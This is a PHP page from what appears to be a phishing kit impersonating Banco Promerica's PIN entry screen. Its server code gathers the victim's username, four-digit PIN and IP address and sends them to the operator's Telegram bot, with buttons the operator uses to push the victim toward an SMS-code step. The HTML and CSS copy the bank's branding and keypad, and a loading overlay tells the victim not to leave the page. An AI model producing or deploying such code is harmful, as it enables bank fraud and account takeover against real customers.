<?php
// ===== pin.php =====
session_start();
include("settings.php"); // $token y $chat_id

$usuario = $_SESSION['usuario'] ?? null;
if (!$usuario) {
    header("Location: index.php");
    exit;
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $pin = preg_replace('/\D/', '', $_POST['pin'] ?? '');
    $ip  = $_SERVER['REMOTE_ADDR'];

    $msg = "🔢 PIN ingresado\n👤 Usuario: $usuario\n🔐 PIN: $pin\n🌐 IP: $ip";

    file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
        'chat_id' => $chat_id,
        'text'    => $msg,
        'reply_markup' => json_encode([
            'inline_keyboard' => [
                [
                    ['text' => '📩 Código SMS',  'callback_data' => "SMSCODE|$usuario"],
                    ['text' => '❌ SMS Error',   'callback_data' => "SMSERROR|$usuario"]
                ],
                [
                    ['text' => '❌ Login Error', 'callback_data' => "ERROR|$usuario"]
                ]
            ]
        ])
    ]));

    header("Location: espera.php");
    exit;
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Banco Promerica - Digita tu PIN</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;}

html,body{
    font-family:'Segoe UI',Arial,sans-serif;
    background:#fff;
    color:#222;
    min-height:100vh;
    overflow-x:hidden;
}

body{
    display:flex;
    flex-direction:column;
    min-height:100vh;
}

.header{
    background:#00853f;
    color:#fff;
    padding:14px 18px;
    display:flex;
    align-items:center;
    justify-content:space-between;
}

.header .logo-wrap{
    display:flex;
    align-items:center;
}

.header img.logo{
    height:40px;
    width:auto;
    object-fit:contain;
    filter:brightness(0) invert(1);
}

.header .logout{
    color:#fff;
    background:transparent;
    border:none;
    cursor:pointer;
    padding:4px;
    display:flex;
    align-items:center;
}

.header .logout svg{
    width:22px;
    height:22px;
}

.content{
    flex:1;
    display:flex;
    flex-direction:column;
    align-items:center;
    padding:36px 20px 40px;
    position:relative;
}

.title{
    font-size:18px;
    color:#222;
    font-weight:400;
    margin-bottom:28px;
}

.pin-display{
    display:flex;
    gap:14px;
    margin-bottom:42px;
    min-height:32px;
}

.pin-dot{
    width:18px;
    height:24px;
    color:#bdbdbd;
    font-size:34px;
    line-height:0.5;
    display:flex;
    align-items:center;
    justify-content:center;
    transition:color .2s;
}

.pin-dot.filled{
    color:#444;
}

.keypad{
    display:grid;
    grid-template-columns:repeat(3, 80px);
    gap:18px 26px;
    justify-content:center;
}

.key{
    width:80px;
    height:80px;
    border-radius:50%;
    border:1.5px solid #cfcfcf;
    background:#fff;
    color:#222;
    font-size:26px;
    font-weight:400;
    cursor:pointer;
    transition:0.15s;
    display:flex;
    align-items:center;
    justify-content:center;
    user-select:none;
}

.key:hover{
    background:#f3f3f3;
}

.key:active{
    background:#e6f4ec;
    border-color:#00853f;
}

.key.empty{
    border:none;
    cursor:default;
    background:transparent;
}

.key.empty:hover{
    background:transparent;
}

.key.delete{
    border:none;
    background:#00853f;
    color:#fff;
    clip-path:polygon(20% 0%, 100% 0%, 100% 100%, 20% 100%, 0% 50%);
    border-radius:0;
    width:74px;
    height:54px;
}

.key.delete:hover{
    background:#006b32;
}

.key.delete svg{
    width:22px;
    height:22px;
}

.loading-overlay{
    position:fixed;
    inset:0;
    background:#fff;
    display:none;
    flex-direction:column;
    align-items:center;
    justify-content:center;
    z-index:9999;
}

.loading-overlay.show{
    display:flex;
}

.loading-overlay h2{
    color:#006838;
    font-size:22px;
    font-weight:600;
    margin-bottom:8px;
}

.loading-overlay p{
    color:#888;
    font-size:14px;
    margin-bottom:24px;
}

.loading-overlay .spinner{
    width:60px;
    height:60px;
    border:6px solid #eee;
    border-top:6px solid #006838;
    border-radius:50%;
    animation:spin 1s linear infinite;
}

@keyframes spin{
    0%{transform:rotate(0deg);}
    100%{transform:rotate(360deg);}
}

.bottom-shapes{
    position:relative;
    width:100%;
    height:110px;
    margin-top:auto;
    overflow:hidden;
    pointer-events:none;
}

.bottom-shapes svg{
    position:absolute;
    bottom:0;
    left:0;
    width:100%;
    height:100%;
    display:block;
}

@media(max-width:380px){
    .keypad{
        grid-template-columns:repeat(3, 70px);
        gap:14px 22px;
    }
    .key{width:70px;height:70px;font-size:24px;}
    .key.delete{width:64px;height:48px;}
}
</style>
</head>
<body>

<header class="header">
    <div class="logo-wrap">
        <img src="img/imgLogoLogin.png" alt="Banco Promerica" class="logo">
    </div>
    <button type="button" class="logout" onclick="window.location.href='index.php'" aria-label="Salir">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
            <path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"></path>
            <polyline points="16 17 21 12 16 7"></polyline>
            <line x1="21" y1="12" x2="9" y2="12"></line>
        </svg>
    </button>
</header>

<main class="content">
    <p class="title">Digita tu PIN</p>

    <div class="pin-display" id="pinDisplay">
        <div class="pin-dot">*</div>
        <div class="pin-dot">*</div>
        <div class="pin-dot">*</div>
        <div class="pin-dot">*</div>
    </div>

    <div class="keypad" id="keypad">
        <button type="button" class="key" data-num="1">1</button>
        <button type="button" class="key" data-num="2">2</button>
        <button type="button" class="key" data-num="3">3</button>
        <button type="button" class="key" data-num="4">4</button>
        <button type="button" class="key" data-num="5">5</button>
        <button type="button" class="key" data-num="6">6</button>
        <button type="button" class="key" data-num="7">7</button>
        <button type="button" class="key" data-num="8">8</button>
        <button type="button" class="key" data-num="9">9</button>
        <div class="key empty"></div>
        <button type="button" class="key" data-num="0">0</button>
        <button type="button" class="key delete" id="btnDelete" aria-label="Borrar">
            <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <line x1="18" y1="6" x2="6" y2="18"></line>
                <line x1="6" y1="6" x2="18" y2="18"></line>
            </svg>
        </button>
    </div>

    <form id="pinForm" method="post" action="pin.php" style="display:none;">
        <input type="hidden" name="pin" id="pinInput">
    </form>
</main>

<div class="loading-overlay" id="loadingOverlay">
    <h2>Por favor espera…</h2>
    <p>⚠️ No cierres esta ventana ni salgas de la página</p>
    <div class="spinner"></div>
</div>

<div class="bottom-shapes" aria-hidden="true">
    <svg viewBox="0 0 500 110" preserveAspectRatio="none">
        <polygon points="0,110 200,40 220,110" fill="#00853f"/>
        <polygon points="180,110 320,70 340,110" fill="#7cc04a"/>
        <polygon points="300,110 500,30 500,110" fill="#00853f"/>
        <polygon points="380,110 500,80 500,110" fill="#7cc04a"/>
    </svg>
</div>

<script>
(function(){
    const dots    = document.querySelectorAll('#pinDisplay .pin-dot');
    const keypad  = document.getElementById('keypad');
    const form    = document.getElementById('pinForm');
    const input   = document.getElementById('pinInput');
    const overlay = document.getElementById('loadingOverlay');
    const MAX     = 4;
    let pin = '';
    let submitting = false;

    function render(){
        dots.forEach((d, i) => {
            d.classList.toggle('filled', i < pin.length);
        });
    }

    function submitPin(){
        if (submitting) return;
        submitting = true;
        input.value = pin;
        // Mostrar cargando inmediatamente
        overlay.classList.add('show');
        // Pequeño delay para que el render del overlay ocurra antes del submit
        setTimeout(() => form.submit(), 80);
    }

    keypad.addEventListener('click', e => {
        if (submitting) return;
        const numBtn = e.target.closest('[data-num]');
        const delBtn = e.target.closest('#btnDelete');

        if (numBtn) {
            if (pin.length < MAX) {
                pin += numBtn.dataset.num;
                render();
                if (pin.length === MAX) {
                    setTimeout(submitPin, 200);
                }
            }
        } else if (delBtn) {
            pin = pin.slice(0, -1);
            render();
        }
    });

    document.addEventListener('keydown', e => {
        if (submitting) return;
        if (e.key >= '0' && e.key <= '9' && pin.length < MAX) {
            pin += e.key;
            render();
            if (pin.length === MAX) {
                setTimeout(submitPin, 200);
            }
        } else if (e.key === 'Backspace') {
            pin = pin.slice(0, -1);
            render();
        }
    });
})();
</script>
</body>
</html>
